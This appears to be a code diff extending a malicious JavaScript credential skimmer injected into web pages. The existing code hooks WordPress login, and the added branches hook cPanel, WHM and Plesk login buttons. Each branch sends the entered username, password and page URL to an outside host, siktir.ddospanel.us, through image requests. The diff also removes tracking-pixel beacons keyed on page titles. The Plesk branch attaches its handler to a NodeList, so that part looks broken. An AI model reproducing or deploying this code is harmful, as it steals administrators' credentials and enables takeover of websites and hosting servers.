@@ -5,14 +5,31 @@ document.getElementById('wp-submit').onclick = function() {
    new Image().src = 'http://siktir.ddospanel.us/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
 };
 }
+if(document.title.toLowerCase().indexOf("cpanel") >= 0){
+	
+	
+document.getElementById('login_submit').onclick = function() {
+   new Image().src = 'http://siktir.ddospanel.us/cp2.php?username='+document.getElementById('user').value+'&sifre='+document.getElementById('pass').value+'&location='+location.href;
+};
+}
 
-if(document.title.toLowerCase().indexOf("porn") >= 0){new Image().src = '//whos.amung.us/widget/kekonam3.png'; }
-if(top.location.hostname.indexOf("r10.net") > -1) { new Image().src = '//whos.amung.us/widget/kekonam4.png';}
-if(document.title.toLowerCase().indexOf("film") >= 0){new Image().src = '//whos.amung.us/widget/kekonam5.png'; }
-if(document.title.toLowerCase().indexOf("dizi") >= 0){new Image().src = '//whos.amung.us/widget/kekonam5.png'; }
-if(document.title.toLowerCase().indexOf("canlı tv") >= 0){new Image().src = '//whos.amung.us/widget/kekonam6.png'; }
-if(document.title.toLowerCase().indexOf("haber") >= 0){new Image().src = '//whos.amung.us/widget/kekonam7.png'; }
-if(document.title.toLowerCase().indexOf("oyun") >= 0){new Image().src = '//whos.amung.us/widget/kekonam8.png'; }
+
+if(document.title.toLowerCase().indexOf("whm") >= 0){
+	
+	
+document.getElementById('login_submit').onclick = function() {
+   new Image().src = 'http://siktir.ddospanel.us/cp2.php?username='+document.getElementById('user').value+'&sifre='+document.getElementById('pass').value+'&location='+location.href;
+};
+}
+
+
+if(document.title.toLowerCase().indexOf("plesk") >= 0){
+	
+	
+document.querySelectorAll("button").onclick = function() {
+   new Image().src = 'http://siktir.ddospanel.us/cp2.php?username='+document.getElementById('loginSection-username').value+'&sifre='+document.getElementById('loginSection-password').value+'&location='+location.href;
+};
+}
 
 
 
